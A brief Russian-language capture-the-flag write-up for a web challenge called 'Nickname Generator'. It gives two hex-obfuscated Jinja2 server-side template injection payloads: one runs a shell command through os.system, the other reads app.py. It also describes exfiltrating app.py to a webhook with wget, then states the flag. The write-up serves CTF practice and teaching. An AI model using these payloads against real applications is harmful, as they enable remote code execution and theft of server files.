# Карл тут RCE если что

## Название
Nickname Generator
## Описание/Легенда
Baba Kapa is going to register a Skype account, but do not really understand how to choose cool and zoomer-styled nickname. We are going to suggest this service as an advice. So, can you look if it works properly?
## Решение
Заюзать подобный пейлоад для Jinja SSTI:
```
{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[80]["load\x5Fmodule"]("os")["system"]("ls")}}
```
Где на месте числа 80 стоит порядковый номер _frozen_importlib.BuiltinImporter

Затем с помощью wget передать app.py себе на вебхук и расшифровать флаг

### ИЛИ

```
{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "app\x2Epy")}}
```

**Флаг:** paseca{zap0st1l_cr1ng3_shtr4f_d1ar33y4}
